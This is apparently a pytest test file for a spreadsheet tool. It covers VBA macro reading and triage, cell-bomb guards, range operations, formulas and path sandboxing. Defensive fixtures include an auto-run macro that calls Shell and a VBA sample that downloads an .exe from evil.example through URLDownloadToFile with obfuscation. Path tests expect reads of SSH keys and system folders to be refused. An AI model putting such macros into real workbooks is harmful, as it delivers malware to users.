"""Phase 8: read-only macros (VBA reader, #vba, triage, export) and the cell-count guard."""

from __future__ import annotations

import re
import zipfile
from dataclasses import replace
from pathlib import Path

import openpyxl
import pytest

from slim_sheet.adapters import limits
from slim_sheet.adapters.ovba import compress, decompress, parse_dir
from slim_sheet.adapters.vba import has_macros, read_project
from slim_sheet.config import Settings, load_settings
from slim_sheet.core.errors import ErrorCode, SlimError
from slim_sheet.core.file_formula import from_file, is_dynamic, spill_extent, to_file
from slim_sheet.core.models import CellRange
from slim_sheet.core.render_formula import compact_cells
from slim_sheet.core.report_spec import infer_format
from slim_sheet.core.vba_triage import triage
from slim_sheet.interfaces.handlers import Handlers
from slim_sheet.services import macros
from tests.vba_fixtures import build_cfb, macro_workbook, vba_project_bin

AUTO_OPEN = 'Private Sub Workbook_Open()\n  Shell "cmd /c calc"\nEnd Sub\n'
HELLO = 'Sub Hello()\n  MsgBox "hi"\nEnd Sub\n'


@pytest.fixture
def xlsm(tmp_path: Path) -> Path:
    return macro_workbook(
        tmp_path / "book.xlsm",
        {
            "ThisWorkbook": ("document", AUTO_OPEN),
            "Module1": ("standard", HELLO),
            "Helper": ("class", "Public Name As String\n"),
        },
    )


# --- compression and dir stream ------------------------------------------------------------


def test_spec_example_decompresses() -> None:
    # Arrange: [MS-OVBA] 3.2.1, "abcdefghijklmnopqrstuv."
    data = bytes.fromhex("0119B000616263646566676800696A6B6C6D6E6F70007172737475762E")

    # Act / Assert
    assert decompress(data) == b"abcdefghijklmnopqrstuv."


@pytest.mark.parametrize("size", [0, 1, 4095, 4096, 4097, 20_000])
def test_compress_round_trips(size: int) -> None:
    # Arrange
    text = (b'Sub Fill()\r\n  Range("A1").Value = 1\r\nEnd Sub\r\n' * 600)[:size]

    # Act
    packed = compress(text)

    # Assert
    assert decompress(packed) == text and (size < 500 or len(packed) < size)


def test_decompress_rejects_bad_input() -> None:
    # Act / Assert
    with pytest.raises(SlimError, match="0x01"):
        decompress(b"\x02abc")
    with pytest.raises(SlimError, match="exceeds"):
        decompress(compress(b"a" * 9000), limit=4096)
    with pytest.raises(SlimError, match="dir stream"):
        parse_dir(b"\x19\x00\xff\x00\x00\x00ab")


# --- reader ---------------------------------------------------------------------------------


def test_reader_lists_modules_kinds_and_source(xlsm: Path) -> None:
    # Act
    project = read_project(xlsm)

    # Assert
    assert project is not None and project.name == "VBAProject"
    assert [(m.name, m.kind) for m in project.modules] == [
        ("ThisWorkbook", "document"),
        ("Module1", "standard"),
        ("Helper", "class"),
    ]
    assert 'MsgBox "hi"' in project.modules[1].source
    assert not project.locked and not project.signed and not project.stomped
    assert has_macros(xlsm) == (True, 0, False)


def test_reader_flags_stomping_and_password(tmp_path: Path) -> None:
    # Arrange: compiled bytes but an empty module text, and a password-protected project
    path = macro_workbook(
        tmp_path / "stomped.xlsm",
        {"Module1": ("standard", "")},
        pcode={"Module1": b"\x01" * 400},
        password=True,
    )

    # Act
    project = read_project(path)

    # Assert
    assert project is not None and project.stomped == ("Module1",) and project.locked


def test_reader_handles_xls_storage_and_files_without_macros(
    tmp_path: Path, sales_xlsx: Path
) -> None:
    # Arrange: an .xls keeps the project in the _VBA_PROJECT_CUR storage
    inner = vba_project_bin({"Module1": ("standard", HELLO)})
    import olefile

    with olefile.OleFileIO(inner) as doc:
        streams = {"/".join(e): doc.openstream(e).read() for e in doc.listdir()}
    xls = tmp_path / "legacy.xls"
    xls.write_bytes(build_cfb({f"_VBA_PROJECT_CUR/{k}": v for k, v in streams.items()}))

    # Act
    project = read_project(xls)

    # Assert
    assert project is not None and "MsgBox" in project.modules[0].source
    assert read_project(sales_xlsx) is None and has_macros(sales_xlsx) == (False, 0, False)


# --- triage ---------------------------------------------------------------------------------


def test_triage_finds_auto_exec_calls_iocs_and_obfuscation() -> None:
    # Arrange
    source = (
        "Sub Auto_Open()\n"
        '  Set o = CreateObject("WScript.Shell") \' runs a tool\n'
        '  URLDownloadToFile 0, "http://evil.example/x.exe", "C:\\t\\x.exe", 0, 0\n'
        '  s = StrReverse("exe.dmc")\n'
        '  \' Shell "commented out"\n'
        "End Sub\n"
    )

    # Act
    found = triage([("Module1", source)], stomped=["Old"])

    # Assert
    kinds = [f.kind for f in found]
    assert kinds[0] == "auto_exec" and "stomped" in kinds
    details = " | ".join(f.detail for f in found)
    assert (
        "COM object" in details
        and "network" in details
        and "URL: http://evil.example/x.exe" in details
    )
    assert "executable file name" in details and any(f.kind == "obfuscation" for f in found)
    assert not any(f.text.startswith("' Shell") for f in found)


# --- tools ----------------------------------------------------------------------------------


def test_overview_reads_macros_from_content(xlsm: Path, settings: Settings) -> None:
    # Act
    text = Handlers(settings).overview("book.xlsm")

    # Assert
    assert "contains VBA macros: 3 module(s)" in text
    assert "runs on its own: ThisWorkbook.Workbook_Open" in text and "#vba" in text


def test_read_vba_lists_modules_and_pages_source(xlsm: Path, settings: Settings) -> None:
    # Arrange
    h = Handlers(settings)
    long_module = "Sub Big()\n" + "".join(f"  x = {i}\n" for i in range(400)) + "End Sub\n"
    big = macro_workbook(xlsm.with_name("big.xlsm"), {"Module1": ("standard", long_module)})

    # Act
    listing = h.read("book.xlsm", sheet="#vba")
    code = h.read("book.xlsm", sheet="#VBA", range="module1")
    first = h.read(big.name, sheet="#vba", range="Module1", max_tokens=300)
    cursor = first.split('cursor="')[1].split('"')[0]
    second = h.read(big.name, sheet="#vba", range="Module1", cursor=cursor, max_tokens=300)

    # Assert
    assert "| ThisWorkbook | document | 3 | ThisWorkbook.Workbook_Open |" in listing
    assert "never runs macros" in listing and "file data" in listing
    assert '   2    MsgBox "hi"' in code and "Attribute VB_Name" not in code
    first_shown = f"{cursor[5:]:>4}  "
    assert cursor.startswith("line:") and any(
        line.startswith(first_shown) for line in second.splitlines()
    )
    with pytest.raises(SlimError, match="No VBA module"):
        h.read("book.xlsm", sheet="#vba", range="Nope")
    with pytest.raises(SlimError, match="Bad cursor"):
        h.read("book.xlsm", sheet="#vba", range="Module1", cursor="12")


def test_anomalies_macros_scope_and_all(xlsm: Path, settings: Settings) -> None:
    # Arrange
    h = Handlers(settings)

    # Act
    rated = h.anomalies("book.xlsm", scope="macros")
    everything = h.anomalies("book.xlsm", scope="all")

    # Assert
    assert (
        "[auto_exec]" in rated and "ThisWorkbook:1" in rated and "runs a program (Shell)" in rated
    )
    assert everything.count("## anomalies") == 3


def test_convert_to_folder_exports_bas_and_cls(xlsm: Path, settings: Settings) -> None:
    # Act
    text = Handlers(settings).convert("book.xlsm", out_path="macros")

    # Assert
    folder = xlsm.with_name("macros")
    exported = sorted(p.name for p in folder.iterdir() if not p.name.startswith("."))
    assert exported == ["Helper.cls", "Module1.bas", "ThisWorkbook.cls"]
    assert 'MsgBox "hi"' in (folder / "Module1.bas").read_text(encoding="cp1252")
    assert "3 VBA module(s)" in text
    with pytest.raises(SlimError, match="already exists"):
        Handlers(settings).convert("book.xlsm", out_path="macros")


def test_macro_tools_explain_files_without_vba(sales_xlsx: Path, settings: Settings) -> None:
    # Act / Assert
    with pytest.raises(SlimError, match="has no VBA project") as info:
        Handlers(settings).read("sales.xlsx", sheet="#vba")
    assert "xlsm" in (info.value.hint or "")
    assert macros.has_project("sales.xlsx", settings) is False


def test_edits_keep_the_vba_project(xlsm: Path, settings: Settings) -> None:
    # Act
    Handlers(settings).write("book.xlsm", "Data", "C1", [["note"]])

    # Assert
    project = read_project(xlsm.with_name("book.slim.xlsm"))
    assert project is not None and len(project.modules) == 3


# --- cell-count guard -----------------------------------------------------------------------


def test_cell_guard_refuses_cell_bombs(tmp_path: Path, settings: Settings) -> None:
    # Arrange: a tiny zip whose sheet declares 50,000 cells
    wb = openpyxl.Workbook()
    ws = wb.active
    assert ws is not None
    for row in range(1, 501):
        for col in range(1, 101):
            ws.cell(row=row, column=col, value=1)
    path = tmp_path / "bomb.xlsx"
    wb.save(path)
    small = replace(settings, max_cells=10_000)

    # Act
    counted = limits.count_cells(path, 10**9)

    # Assert
    assert counted == 50_000
    with pytest.raises(SlimError) as info:
        Handlers(small).overview("bomb.xlsx")
    assert info.value.code == ErrorCode.TOO_LARGE and "SLIM_SHEET_MAX_CELLS" in (
        info.value.hint or ""
    )
    with pytest.raises(SlimError):
        Handlers(small).write("bomb.xlsx", "Sheet", "A1", [[1]])
    assert "bomb.xlsx" in Handlers(replace(settings, max_cells=0)).overview("bomb.xlsx")
    assert load_settings({"SLIM_SHEET_MAX_CELLS": "5"}).max_cells == 5


def test_cell_guard_ignores_csv_and_broken_zip(tmp_path: Path) -> None:
    # Arrange
    csv = tmp_path / "a.csv"
    csv.write_text("a\n1\n", encoding="utf-8")
    broken = tmp_path / "b.xlsx"
    with zipfile.ZipFile(broken, "w") as archive:
        archive.writestr("other.txt", "x")

    # Act / Assert
    limits.check_cells(csv, 1)
    limits.check_cells(broken, 1)


def test_recalc_restores_a_vba_project_libreoffice_changed(
    xlsm: Path, settings: Settings, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    # Arrange: the stub plays LibreOffice and rewrites vbaProject.bin with a damaged copy
    from slim_sheet.adapters import libreoffice
    from slim_sheet.services import recalc

    produced = tmp_path / "lo" / "out" / "book.xlsm"
    produced.parent.mkdir(parents=True)
    with zipfile.ZipFile(xlsm) as source, zipfile.ZipFile(produced, "w") as out:
        for item in source.infolist():
            data = source.read(item.filename)
            out.writestr(item, b"damaged" if item.filename == "xl/vbaProject.bin" else data)
    monkeypatch.setattr(libreoffice, "find_soffice", lambda configured: "soffice")
    monkeypatch.setattr(libreoffice, "recalculate", lambda source, soffice: produced)

    # Act
    result = recalc.recalc("book.xlsm", settings)

    # Assert
    restored = read_project(xlsm.with_name("book.slim.xlsm"))
    assert restored is not None and len(restored.modules) == 3
    assert any("restored byte-for-byte" in w for w in result.warnings)


# --- range_ops clear / split / formats_only -------------------------------------------------


@pytest.fixture
def styled_xlsx(tmp_path: Path) -> Path:
    from openpyxl.styles import Font
    from openpyxl.worksheet.datavalidation import DataValidation

    wb = openpyxl.Workbook()
    ws = wb.active
    assert ws is not None
    ws.title = "S"
    ws.append(["Name", "Parts"])
    ws.append(["a", "x; 12; 1.5"])
    ws.append(["b", "y;3"])
    ws.append(["c", "plain"])
    ws["A1"].font = Font(bold=True, color="FF0000")
    dv = DataValidation(type="list", formula1='"a,b,c"')
    dv.add("A2:A4")
    ws.add_data_validation(dv)
    path = tmp_path / "styled.xlsx"
    wb.save(path)
    return path


def _sheet(path: Path) -> openpyxl.worksheet.worksheet.Worksheet:
    ws = openpyxl.load_workbook(path)["S"]
    return ws


def test_copy_formats_only_paints_styles_not_values(styled_xlsx: Path, settings: Settings) -> None:
    # Act
    text = Handlers(settings).range_ops(
        "styled.xlsx", "S", "copy", range="A1", to="B1:B3", formats_only=True
    )

    # Assert
    ws = _sheet(styled_xlsx.with_name("styled.slim.xlsx"))
    assert "copied formats" in text
    assert ws["B3"].font.bold and ws["B3"].value == "y;3" and not ws["B4"].font.bold
    assert ws["B2"].value == "x; 12; 1.5" and ws["B2"].font.bold


def test_formats_only_rejects_other_ops(styled_xlsx: Path, settings: Settings) -> None:
    # Act / Assert
    with pytest.raises(SlimError, match="formats_only") as info:
        Handlers(settings).range_ops(
            "styled.xlsx", "S", "move", range="A1", to="C1", formats_only=True
        )
    assert "op='copy'" in (info.value.hint or "")


@pytest.mark.parametrize(
    ("what", "value_kept", "bold_kept", "rules_left"),
    [
        ("contents", False, True, 1),
        ("formats", True, False, 1),
        ("rules", True, True, 0),
        ("all", False, False, 0),
    ],
)
def test_clear_what(
    styled_xlsx: Path,
    settings: Settings,
    what: str,
    value_kept: bool,
    bold_kept: bool,
    rules_left: int,
) -> None:
    # Act
    Handlers(settings).range_ops("styled.xlsx", "S", "clear", range="A1:A4", what=what)

    # Assert
    ws = _sheet(styled_xlsx.with_name("styled.slim.xlsx"))
    assert (ws["A1"].value == "Name") is value_kept
    assert bool(ws["A1"].font.bold) is bold_kept
    assert len(ws.data_validations.dataValidation) == rules_left
    assert ws["B2"].value == "x; 12; 1.5"


def test_clear_rejects_unknown_what(styled_xlsx: Path, settings: Settings) -> None:
    # Act / Assert
    with pytest.raises(SlimError, match="what"):
        Handlers(settings).range_ops("styled.xlsx", "S", "clear", range="A1:A4", what="colors")


def test_split_text_to_columns_types_values(styled_xlsx: Path, settings: Settings) -> None:
    # Act
    text = Handlers(settings).range_ops("styled.xlsx", "S", "split", range="B2:B4", delimiter=";")

    # Assert
    ws = _sheet(styled_xlsx.with_name("styled.slim.xlsx"))
    assert "up to 3 column(s)" in text
    assert [ws["B2"].value, ws["C2"].value, ws["D2"].value] == ["x", 12, 1.5]
    assert [ws["B3"].value, ws["C3"].value] == ["y", 3] and ws["B4"].value == "plain"


def test_split_needs_one_column_and_reports_nothing_to_split(
    styled_xlsx: Path, settings: Settings
) -> None:
    # Arrange
    h = Handlers(settings)

    # Act / Assert
    with pytest.raises(SlimError, match="one column"):
        h.range_ops("styled.xlsx", "S", "split", range="A2:B4", delimiter=";")
    assert "nothing to split" in h.range_ops(
        "styled.xlsx", "S", "split", range="A2:A4", delimiter="|"
    )


# --- convert CSV options ----------------------------------------------------------------------


def test_convert_reads_european_csv(tmp_path: Path, settings: Settings) -> None:
    # Arrange: semicolons, decimal commas, Windows-1252 accents
    source = tmp_path / "eu.csv"
    source.write_bytes("Name;Price\nCafé;3,50\nThé;12,25\n".encode("cp1252"))

    # Act
    text = Handlers(settings).convert(
        "eu.csv", out_path="eu.xlsx", delimiter=";", encoding="cp1252", decimal=","
    )

    # Assert
    ws = openpyxl.load_workbook(tmp_path / "eu.xlsx").active
    assert ws is not None and "2 rows" in text
    assert [ws["A2"].value, ws["B2"].value, ws["B3"].value] == ["Café", 3.5, 12.25]


def test_convert_writes_csv_with_bom_and_delimiter(sales_xlsx: Path, settings: Settings) -> None:
    # Act
    Handlers(settings).convert(
        "sales.xlsx", out_path="out.csv", sheet="Orders", delimiter=";", encoding="utf-8-sig"
    )

    # Assert
    raw = sales_xlsx.with_name("out.csv").read_bytes()
    assert raw.startswith(b'\xef\xbb\xbf"OrderID";"Date";"Region"')


def test_convert_csv_option_errors(tmp_path: Path, sales_xlsx: Path, settings: Settings) -> None:
    # Arrange
    (tmp_path / "bad.csv").write_bytes("a\n\xff\xfe\x00z\n".encode("latin-1"))
    h = Handlers(settings)

    # Act / Assert
    with pytest.raises(SlimError, match="not valid utf-8") as info:
        h.convert("bad.csv", out_path="bad.xlsx", encoding="utf-8")
    assert "cp1252" in (info.value.hint or "")
    with pytest.raises(SlimError, match="decimal"):
        h.convert("bad.csv", out_path="bad2.xlsx", decimal=";")
    with pytest.raises(SlimError, match="utf-8-sig"):
        h.convert("sales.xlsx", out_path="o.csv", sheet="Orders", encoding="cp1252")


# --- formulas as Excel stores them, dynamic arrays and spills ------------------------------


@pytest.mark.parametrize(
    ("typed", "stored"),
    [
        ("=FILTER(A1:A3,A1:A3>1)", "=_xlfn._xlws.FILTER(A1:A3,A1:A3>1)"),
        ("=XLOOKUP(2,A1:A3,B1:B3)", "=_xlfn.XLOOKUP(2,A1:A3,B1:B3)"),
        ("=LET(x,A1,y,x*2,x+y)", "=_xlfn.LET(_xlpm.x,A1,_xlpm.y,_xlpm.x*2,_xlpm.x+_xlpm.y)"),
        ("=LAMBDA(a,a+1)(2)", "=_xlfn.LAMBDA(_xlpm.a,_xlpm.a+1)(2)"),
        ("=SUM(A1:A3)", "=SUM(A1:A3)"),
        ("=IFERROR(A1,0)", "=IFERROR(A1,0)"),  # 2007 functions need no prefix
        ('=CONCAT("FILTER(",A1)', '=_xlfn.CONCAT("FILTER(",A1)'),
        ("plain text", "plain text"),
        ("=SUM(", "=SUM("),  # broken formulas are left for validate() to report
    ],
)
def test_to_file_prefixes_like_excel(typed: str, stored: str) -> None:
    # Act
    result = to_file(typed)

    # Assert
    assert result == stored and from_file(result) == typed


def test_to_file_keeps_existing_prefixes() -> None:
    # Act / Assert
    assert to_file("=_xlfn.SEQUENCE(3)") == "=_xlfn.SEQUENCE(3)"
    assert from_file("=_xlfn.SEQUENCE(3)") == "=SEQUENCE(3)"


def test_spill_extent_estimates() -> None:
    # Arrange
    at = CellRange(0, 2, 0, 2)

    # Act / Assert
    assert spill_extent("=SEQUENCE(2,3)", at) == CellRange(0, 2, 1, 4)
    assert spill_extent("=FILTER(A1:B9,A1:A9>1)", at) == CellRange(0, 2, 8, 3)
    assert spill_extent("=TRANSPOSE(A1:C1)", at) == CellRange(0, 2, 2, 2)
    assert spill_extent("=SORT(UNIQUE(A1:A9))", at) is None
    assert spill_extent("=SUM(A1:A3)", at) is None
    assert is_dynamic("=SUM(FILTER(A:A,A:A>1))") and not is_dynamic("=SUM(A1:A3)")


def _sheet_xml(path: Path) -> str:
    with zipfile.ZipFile(path) as archive:
        return archive.read("xl/worksheets/sheet1.xml").decode("utf-8")


def test_write_stores_spilling_formulas_as_dynamic_arrays(
    sales_xlsx: Path, settings: Settings
) -> None:
    # Arrange
    h = Handlers(settings)
    out = sales_xlsx.with_name("sales.slim.xlsx")

    # Act
    h.write("sales.xlsx", "Orders", "H1", [["=UNIQUE(C2:C9)", "=XLOOKUP(1,D2:D9,E2:E9)"]])
    first = _sheet_xml(out)
    h.write("sales.slim.xlsx", "Orders", "K1", [["later edit"]], overwrite=True)

    # Assert: the dynamic cell keeps cm="1" (and the metadata part) through a second edit
    assert '<c r="H1" cm="1"><f t="array" ref="H1">_xlfn.UNIQUE(C2:C9)</f>' in first
    assert "<f>_xlfn.XLOOKUP(1,D2:D9,E2:E9)</f>" in first
    assert '<c r="H1" cm="1">' in _sheet_xml(out)
    with zipfile.ZipFile(out) as archive:
        assert "XLDAPR" in archive.read("xl/metadata.xml").decode("utf-8")
        assert "metadata.xml" in archive.read("[Content_Types].xml").decode("utf-8")
    assert "=UNIQUE(C2:C9)" in h.describe_cell("sales.slim.xlsx", "H1", sheet="Orders")


def test_write_reports_spill_blockers(sales_xlsx: Path, settings: Settings) -> None:
    # Arrange
    h = Handlers(settings)

    # Act
    blocked = h.write("sales.xlsx", "Orders", "A2", [["=SEQUENCE(3,2)"]])
    inside = h.write("sales.slim.xlsx", "Orders", "H1", [["=SEQUENCE(4)"]], overwrite=True)
    into = h.write("sales.slim.xlsx", "Orders", "H3", [["typed"]], overwrite=True)
    free = h.write("sales.slim.xlsx", "Orders", "J1", [["=SEQUENCE(2)"]], overwrite=True)

    # Assert
    assert (
        "A2 =SEQUENCE(3,2) can spill over non-empty B2, A3, B3, ...: Excel would show #SPILL!"
        in blocked
    )
    assert "#SPILL!" not in inside and "#SPILL!" not in free
    assert "H3 is inside the spill range H1:H4 of H1" in into


def test_overwriting_a_spill_anchor_clears_its_old_values(
    tmp_path: Path, settings: Settings
) -> None:
    # Arrange: what Excel saves after calculating =SEQUENCE(3) in A1
    from openpyxl.worksheet.formula import ArrayFormula

    wb = openpyxl.Workbook()
    ws = wb.active
    assert ws is not None
    ws.title = "S"
    ws["A1"] = ArrayFormula("A1:A3", "=_xlfn.SEQUENCE(3)")
    ws["A2"], ws["A3"], ws["B1"] = 2, 3, "keep"
    wb.save(tmp_path / "spill.xlsx")

    # Act
    Handlers(settings).write("spill.xlsx", "S", "A1", [[10]])

    # Assert
    out = openpyxl.load_workbook(tmp_path / "spill.slim.xlsx")["S"]
    assert [out["A1"].value, out["A2"].value, out["A3"].value] == [10, None, None]
    assert out["B1"].value == "keep"


# --- set_table totals / resize, add_chart replace, layout, hidden content -------------------


def _table_book(tmp_path: Path) -> Path:
    wb = openpyxl.Workbook()
    ws = wb.active
    assert ws is not None
    ws.title = "T"
    ws.append(["Region", "Qty", "Note"])
    for row in (["N", 2, "a"], ["S", 3, "b"], ["E", 5, None]):
        ws.append(row)
    path = tmp_path / "t.xlsx"
    wb.save(path)
    return path


def test_set_table_totals_row(tmp_path: Path, settings: Settings) -> None:
    # Arrange
    _table_book(tmp_path)

    # Act
    text = Handlers(settings).set_table("t.xlsx", "T", "A1:C4", "Sales", totals=True)

    # Assert
    ws = openpyxl.load_workbook(tmp_path / "t.slim.xlsx")["T"]
    table = ws.tables["Sales"]
    assert "totals row sums Qty" in text and table.ref == "A1:C5" and table.totalsRowCount == 1
    assert ws["A5"].value == "Total" and ws["B5"].value == "=SUBTOTAL(109,Sales[Qty])"
    assert ws["C5"].value is None and table.autoFilter.ref == "A1:C4"


def test_set_table_resizes_on_rerun(tmp_path: Path, settings: Settings) -> None:
    # Arrange: a totals table, then a new data row typed over its totals row
    _table_book(tmp_path)
    h = Handlers(settings)
    h.set_table("t.xlsx", "T", "A1:C4", "Sales", totals=True)
    h.write("t.slim.xlsx", "T", "A5", [["W", 7, "c"]], overwrite=True)

    # Act
    text = h.set_table("t.slim.xlsx", "T", "A1:C5", "Sales", totals=True, overwrite=True)

    # Assert
    ws = openpyxl.load_workbook(tmp_path / "t.slim.xlsx")["T"]
    assert "resized table Sales" in text and ws.tables["Sales"].ref == "A1:C6"
    assert ws["B6"].value == "=SUBTOTAL(109,Sales[Qty])" and ws["A5"].value == "W"


def test_set_table_refuses_busy_totals_row_and_overlaps(tmp_path: Path, settings: Settings) -> None:
    # Arrange
    _table_book(tmp_path)
    h = Handlers(settings)
    h.set_table("t.xlsx", "T", "A1:C4", "Sales")

    # Act / Assert
    with pytest.raises(SlimError, match="overlaps table Sales"):
        h.set_table("t.slim.xlsx", "T", "A1:B3", "Other", overwrite=True)
    with pytest.raises(SlimError, match="already exists on sheet T") as info:
        _other_sheet_table(h)
    assert "resize" in (info.value.hint or "")
    with pytest.raises(SlimError, match="totals row E3:F3 is not empty"):
        h.write("t.slim.xlsx", "T", "E1", [["a", "b"], [1, 2], [3, 4]], overwrite=True)
        h.set_table("t.slim.xlsx", "T", "E1:F2", "Busy", totals=True, overwrite=True)


def _other_sheet_table(h: Handlers) -> None:
    h.write("t.slim.xlsx", "Other", "A1", [["k", "v"], [1, 2]], overwrite=True)
    h.set_table("t.slim.xlsx", "Other", "A1:B2", "Sales", overwrite=True)


def test_add_chart_replace_swaps_the_chart_at_anchor(tmp_path: Path, settings: Settings) -> None:
    # Arrange
    _table_book(tmp_path)
    h = Handlers(settings)
    h.add_chart("t.xlsx", "T", "column", "A1:B4", anchor="E2")

    # Act
    again = h.add_chart(
        "t.slim.xlsx", "T", "line", "A1:B4", anchor="E2", replace=True, overwrite=True
    )
    nothing = h.add_chart(
        "t.slim.xlsx", "T", "bar", "A1:B4", anchor="M2", replace=True, overwrite=True
    )

    # Assert
    charts = openpyxl.load_workbook(tmp_path / "t.slim.xlsx")["T"]._charts
    assert "replaced 1 chart(s)" in again and "no chart there to replace" in nothing
    assert len(charts) == 2


def test_sheet_layout_calc_mode_and_structure(tmp_path: Path, settings: Settings) -> None:
    # Arrange
    _table_book(tmp_path)
    h = Handlers(settings)

    # Act
    text = h.sheet_layout("t.xlsx", "T", calc_mode="manual", protect_structure=True)

    # Assert
    wb = openpyxl.load_workbook(tmp_path / "t.slim.xlsx")
    assert wb.calculation.calcMode == "manual" and wb.security.lockStructure
    assert "calculation manual" in text and "structure protected (no password)" in text
    with pytest.raises(SlimError, match="calc_mode"):
        h.sheet_layout("t.xlsx", "T", calc_mode="sometimes")


def test_overview_reports_hidden_content(tmp_path: Path, settings: Settings) -> None:
    # Arrange
    from openpyxl.comments import Comment
    from openpyxl.workbook.defined_name import DefinedName

    wb = openpyxl.Workbook()
    ws = wb.active
    assert ws is not None
    ws.title = "Data"
    ws["A1"], ws["B2"] = 1, "x"
    ws["B2"].comment = Comment("note", "me")
    ws.row_dimensions[3].hidden = True
    ws.column_dimensions["C"].hidden = True
    ws["D1"].number_format = ";;;"
    wb.create_sheet("Secret").sheet_state = "veryHidden"
    wb.defined_names["Stash"] = DefinedName("Stash", attr_text="Data!$A$1", hidden=True)
    wb.properties.creator = "Alice"
    wb.save(tmp_path / "h.xlsx")
    expected = (
        "very hidden sheet(s), not listed by Excel's Unhide: Secret",
        "hidden defined name(s): Stash",
        "';;;'",
        "Data: 1 row(s) and 1 column(s) hidden",
        "notes/comments on 1 sheet(s)",
        "author=Alice",
    )

    # Act
    text = Handlers(settings).overview("h.xlsx")

    # Assert
    line = next(t for t in text.splitlines() if t.startswith("hidden content"))
    assert all(part in line for part in expected), line


def test_overview_hidden_content_is_quiet_for_plain_files(
    people_csv: Path, settings: Settings
) -> None:
    # Act
    text = Handlers(settings).overview(people_csv.name)

    # Assert
    assert "hidden content" not in text


def test_split_warns_when_it_overwrites_cells(tmp_path: Path, settings: Settings) -> None:
    # Arrange: column C already holds data that the split of column B runs into
    wb = openpyxl.Workbook()
    ws = wb.active
    assert ws is not None
    ws.title = "S"
    ws.append(["Name", "Full", "Status"])
    ws.append(["a", "Ann Lee", "Open"])
    wb.save(tmp_path / "names.xlsx")

    # Act
    text = Handlers(settings).range_ops("names.xlsx", "S", "split", range="B2", delimiter=" ")

    # Assert
    assert "split overwrote 1 non-empty cell(s) to the right (C2)" in text
    assert "range_ops(op='insert'" in text


def test_set_table_totals_skip_id_like_columns(tmp_path: Path, settings: Settings) -> None:
    # Arrange
    wb = openpyxl.Workbook()
    ws = wb.active
    assert ws is not None
    ws.title = "T"
    ws.append(["OrderID", "Year", "Invoice No", "Qty"])
    ws.append([1001, 2026, 7, 2])
    ws.append([1002, 2026, 8, 3])
    wb.save(tmp_path / "ids.xlsx")

    # Act
    text = Handlers(settings).set_table("ids.xlsx", "T", "A1:D3", "Ids", totals=True)

    # Assert
    out = openpyxl.load_workbook(tmp_path / "ids.slim.xlsx")["T"]
    assert "totals row sums Qty" in text and "OrderID" not in text.split("sums")[1]
    assert [out["A4"].value, out["B4"].value, out["C4"].value] == ["Total", None, None]
    assert out["D4"].value == "=SUBTOTAL(109,Ids[Qty])"


# --- path rules: the path in the chat first, then the default folders ------------------------


def _two_roots(tmp_path: Path, settings: Settings) -> tuple[Settings, Path, Path]:
    first, second = tmp_path / "docs", tmp_path / "gather"
    (second / "excel").mkdir(parents=True)
    first.mkdir()
    wb = openpyxl.Workbook()
    ws = wb.active
    assert ws is not None
    ws.title = "Data"
    ws.append(["Region", "Amount"])
    ws.append(["North", 5])
    wb.save(second / "excel" / "book.xlsx")
    return replace(settings, roots=(first.resolve(), second.resolve())), first, second


def test_relative_path_is_found_in_any_root(tmp_path: Path, settings: Settings) -> None:
    # Arrange: the file lives only in the second root
    two, _first, second = _two_roots(tmp_path, settings)

    # Act
    text = Handlers(two).overview("excel/book.xlsx")
    absolute = Handlers(two).overview(str(second / "excel" / "book.xlsx"))

    # Assert
    assert "book.xlsx" in text and "Data" in text and text == absolute


def test_relative_out_path_lands_next_to_the_source(tmp_path: Path, settings: Settings) -> None:
    # Arrange
    two, first, second = _two_roots(tmp_path, settings)
    h = Handlers(two)

    # Act
    h.convert("excel/book.xlsx", out_path="book.csv")
    h.write("excel/book.xlsx", "Data", "C1", [["note"]], out_path="edited.xlsx")

    # Assert
    assert (second / "excel" / "book.csv").is_file() and (
        second / "excel" / "edited.xlsx"
    ).is_file()
    assert not list(first.iterdir())


def test_overview_without_path_lists_every_root(tmp_path: Path, settings: Settings) -> None:
    # Arrange
    two, _first, second = _two_roots(tmp_path, settings)

    # Act
    text = Handlers(two).overview()

    # Assert
    assert "1 spreadsheet(s) in the allowed folders" in text
    assert str(second / "excel" / "book.xlsx") in text


def test_missing_relative_path_names_the_folders_searched(
    tmp_path: Path, settings: Settings
) -> None:
    # Arrange
    two, first, second = _two_roots(tmp_path, settings)

    # Act / Assert
    with pytest.raises(SlimError, match="No file") as info:
        Handlers(two).overview("nope.xlsx")
    assert str(first) in (info.value.hint or "") and str(second) in (info.value.hint or "")


# --- open paths: any data folder by absolute path, secrets and system folders refused ------


@pytest.fixture
def open_paths(
    tmp_path: Path, settings: Settings, monkeypatch: pytest.MonkeyPatch
) -> tuple[Settings, Path]:
    """Default folder 'home'; 'elsewhere' is a data folder outside it (pytest's temp folder sits in
    AppData, which the real rules refuse, so the system-folder list is faked here)."""
    from slim_sheet.adapters import sandbox

    home, elsewhere = tmp_path / "home", tmp_path / "elsewhere"
    home.mkdir()
    elsewhere.mkdir()
    monkeypatch.setattr(sandbox, "_system_folders", lambda: [tmp_path / "sys"])
    wb = openpyxl.Workbook()
    ws = wb.active
    assert ws is not None
    ws.title = "Data"
    ws.append(["Region", "Amount"])
    ws.append(["North", 5])
    wb.save(elsewhere / "book.xlsx")
    return replace(settings, roots=(home.resolve(),)), elsewhere


def test_absolute_paths_work_anywhere_on_disk(open_paths: tuple[Settings, Path]) -> None:
    # Arrange
    open_settings, elsewhere = open_paths
    h = Handlers(open_settings)
    source = str(elsewhere / "book.xlsx")

    # Act
    text = h.overview(source)
    h.convert(source, out_path="book.csv")
    h.write(source, "Data", "C1", [["note"]])

    # Assert
    assert "Data" in text
    assert (elsewhere / "book.csv").is_file() and (elsewhere / "book.slim.xlsx").is_file()


@pytest.mark.parametrize(
    ("relative", "reason"),
    [
        (".ssh/id_rsa.csv", "hidden folders"),
        ("keys/server.pem", "not a spreadsheet or table file"),
        ("sys/config.xlsx", "system and application-data folders"),
    ],
)
def test_secret_and_system_paths_are_refused(
    open_paths: tuple[Settings, Path], tmp_path: Path, relative: str, reason: str
) -> None:
    # Arrange
    open_settings, _elsewhere = open_paths
    target = tmp_path / relative
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text("a,b\n1,2\n", encoding="utf-8")

    # Act / Assert
    with pytest.raises(SlimError, match=reason) as info:
        Handlers(open_settings).overview(str(target))
    assert info.value.code == ErrorCode.PATH_DENIED


def test_network_shares_are_refused(open_paths: tuple[Settings, Path]) -> None:
    # Act / Assert
    with pytest.raises(SlimError, match="network shares"):
        Handlers(open_paths[0]).overview("//server/share/book.xlsx")
